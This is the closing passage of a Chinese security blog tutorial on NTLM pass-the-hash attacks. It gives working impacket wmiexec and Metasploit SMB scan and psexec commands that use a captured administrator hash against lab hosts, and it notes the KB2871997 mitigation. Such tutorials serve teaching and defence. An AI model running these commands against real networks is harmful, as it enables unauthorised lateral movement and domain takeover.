</span></span><span class=line><span class=cl><span class=c1># 前面的 32 个 0 表示的是 LM hash，但是目标主机是 win 2012 默认不开启 LM hash，所以这里随意填入 32 位长度的字符即可。</span>
</span></span></code></pre></div><p><img src=https://oss.zjun.info/zjun.info/4.png alt=4></p><h4 id=wmiexec><a href=#wmiexec class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href=#contents:wmiexec class=headings>Wmiexec</a></h4><p>python 源码：</p><p><a href=https://github.com/SecureAuthCorp/impacket/edit/master/examples/wmiexec.py target=_blank rel=noopener>https://github.com/SecureAuthCorp/impacket/edit/master/examples/wmiexec.py</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 wmiexec.py -hashes 00000000000000000000000000000000:79c89e2e7418467a4e7b55f8307260ca ZJUN/administrator@192.168.21.200 <span class=s2>&#34;whoami&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># 前面的 32 个 0 表示的是 LM hash，但是目标主机是 win 2012 默认不开启 LM hash，所以这里随意填入 32 位长度的字符即可。</span>
</span></span></code></pre></div><p><img src=https://oss.zjun.info/zjun.info/5.png alt=5></p><p><code>windows exe</code> 版本：</p><p><a href=https://github.com/maaaaz/impacket-examples-windows target=_blank rel=noopener>https://github.com/maaaaz/impacket-examples-windows</a></p><p><img src=https://oss.zjun.info/zjun.info/6.png alt=6></p><h4 id=metasploit-psexec-模块><a href=#metasploit-psexec-模块 class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href=#contents:metasploit-psexec-模块 class=headings>Metasploit psexec 模块</a></h4><p>直接 <code>hash</code> 喷射整个内网段不免缓慢，由于其依赖于 <code>445</code> 或 <code>139</code> 等端口，所以可以先扫一下段内端口开放主机。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>use auxiliary/scanner/smb/smb_version
</span></span><span class=line><span class=cl><span class=nb>set</span> rhosts 192.168.21.0/24
</span></span><span class=line><span class=cl><span class=nb>set</span> threads <span class=m>100</span>
</span></span><span class=line><span class=cl>run
</span></span></code></pre></div><p><img src=https://oss.zjun.info/zjun.info/7.png alt=7></p><p>再利用 <code>psexec</code> 模块进行哈希传递。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>use exploit/windows/smb/psexec
</span></span><span class=line><span class=cl><span class=nb>set</span> lhost 192.168.0.102
</span></span><span class=line><span class=cl><span class=nb>set</span> rhosts 192.168.21.200
</span></span><span class=line><span class=cl><span class=nb>set</span> smbuser administrator
</span></span><span class=line><span class=cl><span class=nb>set</span> smbpass 00000000000000000000000000000000:79c89e2e7418467a4e7b55f8307260ca
</span></span><span class=line><span class=cl>run
</span></span></code></pre></div><p><img src=https://oss.zjun.info/zjun.info/8.png alt=8></p><p>此外还有如<a href=https://github.com/byt3bl33d3r/CrackMapExec target=_blank rel=noopener>CrackMapExec</a>、<a href=https://github.com/brav0hax/smbexec target=_blank rel=noopener>smbexec</a>等工具。</p><p>对于这一缺陷，微软发布了 <code>KB2871997</code> 补丁，在打了该补丁后，对于 <code>SID</code> 非 <code>500</code> 的账户，无论用户名， <code>Pass The Hash</code> 无法成功。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wmic useraccount get name,sid
</span></span></code></pre></div><p><img src=https://oss.zjun.info/zjun.info/9.png alt=9></p></div></article><div class=post-gitinfo><div class=post-gitinfo-left><div class="gitinfo-item commit"><a href=https://github.com/z1un/blog.zjun.info/commit/fe33f174537ee70ae478e9dc95cc99a78619a719 target=_blank rel=noopener><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" class="icon git-icon"><path d="M384 144c0-44.2-35.8-80-80-80s-80 35.8-80 80c0 36.4 24.3 67.1 57.5 76.8-.6 16.1-4.2 28.5-11 36.9-15.4 19.2-49.3 22.4-85.2 25.7-28.2 2.6-57.4 5.4-81.3 16.9v-144c32.5-10.2 56-40.5 56-76.3.0-44.2-35.8-80-80-80S0 35.8.0 80c0 35.8 23.5 66.1 56 76.3v199.3C23.5 365.9.0 396.2.0 432c0 44.2 35.8 80 80 80s80-35.8 80-80c0-34-21.2-63.1-51.2-74.6 3.1-5.2 7.8-9.8 14.9-13.4 16.2-8.2 40.4-10.4 66.1-12.8 42.2-3.9 90-8.4 118.2-43.4 14-17.4 21.1-39.8 21.6-67.9 31.6-10.8 54.4-40.7 54.4-75.9zM80 64c8.8.0 16 7.2 16 16s-7.2 16-16 16-16-7.2-16-16 7.2-16 16-16zm0 384c-8.8.0-16-7.2-16-16s7.2-16 16-16 16 7.2 16 16-7.2 16-16 16zm224-320c8.8.0 16 7.2 16 16s-7.2 16-16 16-16-7.2-16-16 7.2-16 16-16z"/></svg>fe33f17</a></div><div class="gitinfo-item commit-msg"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 192 512" class="icon msg-icon"><path d="M20 424.229h20V279.771H20c-11.046.0-20-8.954-20-20V212c0-11.046 8.954-20 20-20h112c11.046.0 20 8.954 20 20v212.229h20c11.046.0 20 8.954 20 20V492c0 11.046-8.954 20-20 20H20c-11.046.0-20-8.954-20-20v-47.771c0-11.046 8.954-20 20-20zM96 0C56.235.0 24 32.235 24 72s32.235 72 72 72 72-32.235 72-72S135.764.0 96 0z"/></svg>修改链接格式</div></div><div class=post-gitinfo-right><div class="gitinfo-item feedback"><a href=https://github.com/z1un/blog.zjun.info/issues target=_blank rel=noopener><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" class="icon feedback-icon"><path d="M202.021.0C122.202.0 70.503 32.703 29.914 91.026c-7.363 10.58-5.093 25.086 5.178 32.874l43.138 32.709c10.373 7.865 25.132 6.026 33.253-4.148 25.049-31.381 43.63-49.449 82.757-49.449 30.764.0 68.816 19.799 68.816 49.631.0 22.552-18.617 34.134-48.993 51.164-35.423 19.86-82.299 44.576-82.299 106.405V320c0 13.255 10.745 24 24 24h72.471c13.255.0 24-10.745 24-24v-5.773c0-42.86 125.268-44.645 125.268-160.627C377.504 66.256 286.902.0 202.021.0zM192 373.459c-38.196.0-69.271 31.075-69.271 69.271.0 38.195 31.075 69.27 69.271 69.27s69.271-31.075 69.271-69.271-31.075-69.27-69.271-69.27z"/></svg>Feedback</a></div><div class="gitinfo-item edit"><a href=https://github.com/z1un/blog.zjun.info/blob/main/content/tech/NTLM%20%e8%ae%a4%e8%af%81%e5%8d%8f%e8%ae%ae%e5%88%b0%20Pass%20The%20Hash%20%e6%94%bb%e5%87%bb.md target=_blank rel=noopener><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" class="icon edit-icon"><path d="M402.3 344.9l32-32c5-5 13.7-1.5 13.7 5.7V464c0 26.5-21.5 48-48 48H48c-26.5.0-48-21.5-48-48V112c0-26.5 21.5-48 48-48h273.5c7.1.0 10.7 8.6 5.7 13.7l-32 32c-1.5 1.5-3.5 2.3-5.7 2.3H48v352h352V350.5c0-2.1.8-4.1 2.3-5.6zm156.6-201.8L296.3 405.7l-90.4 10c-26.2 2.9-48.5-19.2-45.6-45.6l10-90.4L432.9 17.1c22.9-22.9 59.9-22.9 82.7.0l43.2 43.2c22.9 22.9 22.9 60 .1 82.8zM460.1 174 402 115.9 216.2 301.8l-7.3 65.3 65.3-7.3L460.1 174zm64.8-79.7-43.2-43.2c-4.1-4.1-10.8-4.1-14.8.0L436 82l58.1 58.1 30.9-30.9c4-4.2 4-10.8-.1-14.9z"/></svg>Edit Me?</a></div></div></div><div class=related-posts><h2 class=related-title>相关文章：</h2><ul class=related-list><li class=related-item><a href=/tech/kerberos-protocol-to-ticket-forgery/ class=related-link>Kerberos 协议到票据伪造</a></li><li class=related-item><a href=/tech/from-windows-local-authentication-to-obtaining-hash/ class=related-link>由 Windows 本地认证到 Hash 抓取</a></li><li class=related-item><a href=/tech/bypass-domain-sensitive-group-acl-information-query/ class=related-link>Bypass 域敏感组访问控制信息查询</a></li><li class=related-item><a href=/tech/kerberos-domain-delegation-attack/ class=related-link>Kerberos 域委派攻击</a></li><li class=related-item><a href=/tech/analysis-of-flask-ssti-template-injection/ class=related-link>浅析 Flask SSTI 模板注入</a></li></ul></div><footer class=minimal-footer><div class=post-tag><a href=/tags/windows/ rel=tag class=post-tag-link>#windows</a> <a href=/tags/%E7%BD%91%E7%BB%9C%E8%AE%A4%E8%AF%81/ rel=tag class=post-tag-link>#网络认证</a> <a href=/tags/%E5%9F%9F/ rel=tag class=post-tag-link>#域</a> <a href=/tags/ntlm/ rel=tag class=post-tag-link>#ntlm</a> <a href=/tags/pth/ rel=tag class=post-tag-link>#pth</a></div><div class=post-category><a href=/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/ class=post-category-link>网络安全</a></div></footer><div class=load-comments><div id=load-comments>加载评论</div></div><div id=utterances></div></div></main><div id=back-to-top class=back-to-top><a href=#><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon arrow-up"><path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6.0-33.9L207 39c9.4-9.4 24.6-9.4 33.9.0l194.3 194.3c9.4 9.4 9.4 24.6.0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3.0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z"/></svg></a></div><footer id=footer class=footer><div class=footer-inner><div class=site-info>©&nbsp;2019–2022&nbsp;zjun</div></div></footer></div><script>'serviceWorker'in navigator&&window.addEventListener('load',function(){navigator.serviceWorker.register('/sw.js')})</script><script>function loadComments(){(function(){var e,t=document.getElementById("utterances");if(!t)return;e=document.createElement('script'),e.src='https://utteranc.es/client.js',e.async=!0,e.crossOrigin='anonymous',e.setAttribute('repo','z1un/blog.zjun.info'),e.setAttribute('issue-term','title');const n=getCurrentTheme()==='dark';n?e.setAttribute('theme','photon-dark'):e.setAttribute('theme','github-light'),t.appendChild(e)})()}</script><script src=/js/medium-zoom.min.js></script>
<script>let imgNodes=document.querySelectorAll('div.post-body img');imgNodes=Array.from(imgNodes).filter(e=>e.parentNode.tagName!=="A"),mediumZoom(imgNodes,{background:'hsla(var(--color-bg-h), var(--color-bg-s), var(--color-bg-l), 0.95)'})</script></body></html>